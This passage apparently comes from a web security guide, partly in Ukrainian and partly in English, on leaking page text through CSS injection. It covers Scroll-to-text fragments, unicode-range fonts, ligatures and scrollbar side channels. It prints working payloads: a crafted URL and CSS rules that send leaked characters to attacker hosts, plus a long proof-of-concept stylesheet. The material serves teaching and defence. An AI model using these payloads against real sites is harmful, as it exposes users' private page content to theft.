–ü—Ä–æ–±–ª–µ–º–∞ –±–µ–∑–ø–µ–∫–∏ –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é **Scroll-to-text** —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ó–º –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç—É –Ω–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ —Ä–µ—Å—É—Ä—Å –∑ —ó—Ö–Ω—å–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ —á–µ—Ä–µ–∑ HTML-—ñ–Ω'—î–∫—Ü—ñ—é. –ú–µ—Ç–æ–¥ –ø–æ–ª—è–≥–∞—î –≤ —ñ–Ω'—î–∫—Ü—ñ—ó CSS –ø—Ä–∞–≤–∏–ª–∞, —è–∫ —Ü–µ:
```css
:target::before { content : url(target.png) }
```
–£ —Ç–∞–∫–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, —è–∫—â–æ —Ç–µ–∫—Å—Ç "Administrator" –ø—Ä–∏—Å—É—Ç–Ω—ñ–π –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, —Ä–µ—Å—É—Ä—Å `target.png` –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è –∑ —Å–µ—Ä–≤–µ—Ä–∞, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —Ç–µ–∫—Å—Ç—É. –ü—Ä–∏–∫–ª–∞–¥ —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —á–µ—Ä–µ–∑ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–µ URL, —è–∫–µ –≤–±—É–¥–æ–≤—É—î —ñ–Ω'—î–∫—Ü—ñ–π–Ω–∏–π CSS —Ä–∞–∑–æ–º –∑ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
–¢—É—Ç –∞—Ç–∞–∫–∞ –º–∞–Ω—ñ–ø—É–ª—é—î HTML-—ñ–Ω'—î–∫—Ü—ñ—î—é –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ CSS-–∫–æ–¥—É, –Ω–∞—Ü—ñ–ª—é—é—á–∏—Å—å –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Ç–µ–∫—Å—Ç "Administrator" —á–µ—Ä–µ–∑ —Ñ—Ä–∞–≥–º–µ–Ω—Ç Scroll-to-text (`#:~:text=Administrator`). –Ø–∫—â–æ —Ç–µ–∫—Å—Ç –∑–Ω–∞–π–¥–µ–Ω–æ, –≤–∫–∞–∑–∞–Ω–∏–π —Ä–µ—Å—É—Ä—Å –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è, –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ —Å–∏–≥–Ω–∞–ª—ñ–∑—É—é—á–∏ –ø—Ä–æ —Å–≤–æ—é –ø—Ä–∏—Å—É—Ç–Ω—ñ—Å—Ç—å –∞—Ç–∞–∫—É—é—á–æ–º—É.

–î–ª—è –ø–æ–º'—è–∫—à–µ–Ω–Ω—è —Å–ª—ñ–¥ –∑–≤–µ—Ä–Ω—É—Ç–∏ —É–≤–∞–≥—É –Ω–∞ —Ç–∞–∫—ñ –ø—É–Ω–∫—Ç–∏:

1. **–û–±–º–µ–∂–µ–Ω–µ —Å–ø—ñ–≤–≤—ñ–¥–Ω–æ—à–µ–Ω–Ω—è STTF**: –§—Ä–∞–≥–º–µ–Ω—Ç Scroll-to-text (STTF) –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è —Å–ø—ñ–≤–≤—ñ–¥–Ω–æ—à–µ–Ω–Ω—è –ª–∏—à–µ —Å–ª—ñ–≤ –∞–±–æ —Ä–µ—á–µ–Ω—å, —Ç–∏–º —Å–∞–º–∏–º –æ–±–º–µ–∂—É—é—á–∏ –π–æ–≥–æ –∑–¥–∞—Ç–Ω—ñ—Å—Ç—å –≤–∏—Ç—ñ–∫–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ —Å–µ–∫—Ä–µ—Ç–∏ –∞–±–æ —Ç–æ–∫–µ–Ω–∏.
2. **–û–±–º–µ–∂–µ–Ω–Ω—è –¥–æ –≤–µ—Ä—Ö–Ω—å–æ–≥–æ —Ä—ñ–≤–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ–≤ –ø–µ—Ä–µ–≥–ª—è–¥—É**: STTF –ø—Ä–∞—Ü—é—î –≤–∏–∫–ª—é—á–Ω–æ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö –≤–µ—Ä—Ö–Ω—å–æ–≥–æ —Ä—ñ–≤–Ω—è –ø–µ—Ä–µ–≥–ª—è–¥—É —ñ –Ω–µ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω—É—î –≤ iframe, —â–æ —Ä–æ–±–∏—Ç—å –±—É–¥—å-—è–∫—É —Å–ø—Ä–æ–±—É –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –±—ñ–ª—å—à –ø–æ–º—ñ—Ç–Ω–æ—é –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
3. **–ù–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**: STTF –≤–∏–º–∞–≥–∞—î –∂–µ—Å—Ç—É –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è —Ä–æ–±–æ—Ç–∏, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –º–æ–∂–ª–∏–≤—ñ –ª–∏—à–µ —á–µ—Ä–µ–∑ —ñ–Ω—ñ—Ü—ñ–π–æ–≤–∞–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –Ω–∞–≤—ñ–≥–∞—Ü—ñ—é. –¶—è –≤–∏–º–æ–≥–∞ –∑–Ω–∞—á–Ω–æ –∑–º–µ–Ω—à—É—î —Ä–∏–∑–∏–∫ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –∞—Ç–∞–∫ –±–µ–∑ –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º. –ü—Ä–æ—Ç–µ –∞–≤—Ç–æ—Ä –±–ª–æ–≥—É –≤–∫–∞–∑—É—î –Ω–∞ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ —É–º–æ–≤–∏ —Ç–∞ –æ–±—Ö–æ–¥–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–æ—Ü—ñ–∞–ª—å–Ω–∞ —ñ–Ω–∂–µ–Ω–µ—Ä—ñ—è, –≤–∑–∞—î–º–æ–¥—ñ—è –∑ –ø–æ—à–∏—Ä–µ–Ω–∏–º–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º–∏ –±—Ä–∞—É–∑–µ—Ä–∞), —è–∫—ñ –º–æ–∂—É—Ç—å –ø–æ–ª–µ–≥—à–∏—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—é –∞—Ç–∞–∫–∏.

–û–±—ñ–∑–Ω–∞–Ω—ñ—Å—Ç—å –ø—Ä–æ —Ü—ñ –º–µ—Ö–∞–Ω—ñ–∑–º–∏ —Ç–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —î –∫–ª—é—á–æ–≤–æ—é –¥–ª—è –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –≤–µ–±-–±–µ–∑–ø–µ–∫–∏ —Ç–∞ –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ —Ç–∞–∫–∏—Ö –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ–π–Ω–∏—Ö —Ç–∞–∫—Ç–∏–∫.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∑–≤—ñ—Ç: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ [**–µ–∫—Å–ø–ª–æ–π—Ç, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É –¥–ª—è CTF —Ç—É—Ç**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ **–∑–æ–≤–Ω—ñ—à–Ω—ñ —à—Ä–∏—Ñ—Ç–∏ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω—å unicode**, —è–∫—ñ –±—É–¥—É—Ç—å **–∑–±–∏—Ä–∞—Ç–∏—Å—è –ª–∏—à–µ —è–∫—â–æ —Ü—ñ –∑–Ω–∞—á–µ–Ω–Ω—è unicode –ø—Ä–∏—Å—É—Ç–Ω—ñ** –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [–í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö —É —á—É–¥–æ–≤–æ–º—É —Å—Ç–∏–ª—ñ ‚Äì —Ç–æ–±—Ç–æ —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ CSS –¥–ª—è –∞—Ç–∞–∫ –Ω–∞ –≤–µ–±–¥–æ–¥–∞—Ç–æ–∫](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

The technique described involves extracting text from a node by exploiting font ligatures and monitoring changes in width. The process involves several steps:

1. **Creation of Custom Fonts**:
- SVG fonts are crafted with glyphs having a `horiz-adv-x` attribute, which sets a large width for a glyph representing a two-character sequence.
- Example SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, where "XY" denotes a two-character sequence.
- These fonts are then converted to woff format using fontforge.

2. **Detection of Width Changes**:
- CSS is used to ensure that text does not wrap (`white-space: nowrap`) and to customize the scrollbar style.
- The appearance of a horizontal scrollbar, styled distinctly, acts as an indicator (oracle) that a specific ligature, and hence a specific character sequence, is present in the text.
- The CSS involved:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Exploit Process**:
- **Step 1**: Fonts are created for pairs of characters with substantial width.
- **Step 2**: A scrollbar-based trick is employed to detect when the large width glyph (ligature for a character pair) is rendered, indicating the presence of the character sequence.
- **Step 3**: Upon detecting a ligature, new glyphs representing three-character sequences are generated, incorporating the detected pair and adding a preceding or succeeding character.
- **Step 4**: Detection of the three-character ligature is carried out.
- **Step 5**: The process repeats, progressively revealing the entire text.

4. **Optimization**:
- The current initialization method using `<meta refresh=...` is not optimal.
- A more efficient approach could involve the CSS `@import` trick, enhancing the exploit's performance.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). The charset used in a text node can be leaked **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —à—Ä–∏—Ñ—Ç–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –≤ –±—Ä–∞—É–∑–µ—Ä—ñ: –∂–æ–¥–Ω—ñ –∑–æ–≤–Ω—ñ—à–Ω—ñ - –∞–±–æ –∫–∞—Å—Ç–æ–º–Ω—ñ - —à—Ä–∏—Ñ—Ç–∏ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ.

The concept revolves around utilizing an animation to incrementally expand a `div`'s width, allowing one character at a time to transition from the 'suffix' part of the text to the 'prefix' part. This process effectively splits the text into two sections:

1. **Prefix**: The initial line.
2. **Suffix**: The subsequent line(s).

The transition stages of the characters would appear as follows:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


During this transition, the **unicode-range trick** is employed to identify each new character as it joins the prefix. This is achieved by switching the font to Comic Sans, which is notably taller than the default font, consequently triggering a vertical scrollbar. This scrollbar's appearance indirectly reveals the presence of a new character in the prefix.

Although this method allows the detection of unique characters as they appear, it does not specify which character is repeated, only that a repetition has occurred.

{% hint style="info" %}
Basically, the **unicode-range is used to detect a char**, but as we don't want to load an external font, we need to find another way.\
When the **char** is **found**, it's **given** the pre-installed **Comic Sans font**, which **makes** the char **bigger** and **triggers a scroll bar** which will **leak the found char**.
{% endhint %}

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): –≤–∏—Ç—ñ–∫ –∫–æ–¥—É–≤–∞–Ω–Ω—è –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º —à—Ä–∏—Ñ—Ç—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —à–ª—è—Ö–æ–º –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ (–Ω–µ –≤–∏–º–∞–≥–∞—î –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** –¶–µ –∑–≥–∞–¥—É—î—Ç—å—Å—è —è–∫ [–Ω–µ–≤–¥–∞–ª–µ —Ä—ñ—à–µ–Ω–Ω—è –≤ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

–¶–µ–π –≤–∏–ø–∞–¥–æ–∫ –¥—É–∂–µ —Å—Ö–æ–∂–∏–π –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π, –æ–¥–Ω–∞–∫ —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–µ—Ç–∞ –∑—Ä–æ–±–∏—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ **—Å–∏–º–≤–æ–ª–∏ –±—ñ–ª—å—à–∏–º–∏ –∑–∞ —ñ–Ω—à—ñ, —â–æ–± –ø—Ä–∏—Ö–æ–≤–∞—Ç–∏ —â–æ—Å—å** –Ω–∞ –∫—à—Ç–∞–ª—Ç –∫–Ω–æ–ø–∫–∏, —â–æ–± —ó—ó –Ω–µ –Ω–∞—Ç–∏—Å–Ω—É–≤ –±–æ—Ç, –∞–±–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —è–∫–µ –Ω–µ –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–∏ –º–æ–≥–ª–∏ –± –≤–∏–º—ñ—Ä—è—Ç–∏ –¥—ñ—é (–∞–±–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –¥—ñ—ó) —ñ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Å–∏–º–≤–æ–ª —É —Ç–µ–∫—Å—Ç—ñ.

### Text node exfiltration (III): –≤–∏—Ç—ñ–∫ –∫–æ–¥—É–≤–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–∞–π–º—ñ–Ω–≥—É –∫–µ—à—É (–Ω–µ –≤–∏–º–∞–≥–∞—î –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** –¶–µ –∑–≥–∞–¥—É—î—Ç—å—Å—è —è–∫ [–Ω–µ–≤–¥–∞–ª–µ —Ä—ñ—à–µ–Ω–Ω—è –≤ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –º–æ–≥–ª–∏ –± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏—Ç—ñ–∫–∞—Ç–∏, —á–∏ —î —Å–∏–º–≤–æ–ª —É —Ç–µ–∫—Å—Ç—ñ, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ —Ñ–µ–π–∫–æ–≤–∏–π —à—Ä–∏—Ñ—Ç –∑ —Ç–æ–≥–æ –∂ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
–Ø–∫—â–æ —î –∑–±—ñ–≥, **—à—Ä–∏—Ñ—Ç –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –∑ `/static/bootstrap.min.css?q=1`**. –•–æ—á–∞ –≤—ñ–Ω –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è —É—Å–ø—ñ—à–Ω–æ, **–±—Ä–∞—É–∑–µ—Ä –ø–æ–≤–∏–Ω–µ–Ω –π–æ–≥–æ –∫–µ—à—É–≤–∞—Ç–∏**, —ñ –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –∫–µ—à—É –Ω–µ–º–∞—î, —ñ—Å–Ω—É—î –º–µ—Ö–∞–Ω—ñ–∑–º **304 not modified**, —Ç–æ–º—É **–≤—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ —à–≤–∏–¥—à–æ—é** –∑–∞ —ñ–Ω—à—ñ.

–û–¥–Ω–∞–∫, —è–∫—â–æ —Ä—ñ–∑–Ω–∏—Ü—è –≤ —á–∞—Å—ñ –º—ñ–∂ –∫–µ—à–æ–≤–∞–Ω–æ—é –≤—ñ–¥–ø–æ–≤—ñ–¥–¥—é —Ç–∞ –Ω–µ–∫–µ—à–æ–≤–∞–Ω–æ—é –Ω–µ —î –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –≤–µ–ª–∏–∫–æ—é, —Ü–µ –Ω–µ –±—É–¥–µ –∫–æ—Ä–∏—Å–Ω–æ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∞–≤—Ç–æ—Ä –∑–∞–∑–Ω–∞—á–∏–≤: –û–¥–Ω–∞–∫, –ø—ñ—Å–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è, —è –≤–∏—è–≤–∏–≤, —â–æ –ø–µ—Ä—à–∞ –ø—Ä–æ–±–ª–µ–º–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —à–≤–∏–¥–∫—ñ—Å—Ç—å –Ω–µ –¥—É–∂–µ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è, –∞ –¥—Ä—É–≥–∞ –ø—Ä–æ–±–ª–µ–º–∞ –≤ —Ç–æ–º—É, —â–æ –±–æ—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–∞–ø–æ—Ä `disk-cache-size=1`, —â–æ –¥—ñ–π—Å–Ω–æ –ø—Ä–æ–¥—É–º–∞–Ω–æ.

### Exfiltration —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –≤—É–∑–ª–∞ (III): –≤–∏—Ç—ñ–∫ –∫–æ–¥—É–≤–∞–Ω–Ω—è —Å–∏–º–≤–æ–ª—ñ–≤ —à–ª—è—Ö–æ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–æ—Ç–µ–Ω—å –ª–æ–∫–∞–ª—å–Ω–∏—Ö "—à—Ä–∏—Ñ—Ç—ñ–≤" (–Ω–µ –≤–∏–º–∞–≥–∞—é—á–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**–ü–æ—Å–∏–ª–∞–Ω–Ω—è:** –¶–µ –∑–≥–∞–¥—É—î—Ç—å—Å—è —è–∫ [–Ω–µ–≤–¥–∞–ª–µ —Ä—ñ—à–µ–Ω–Ω—è –≤ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)
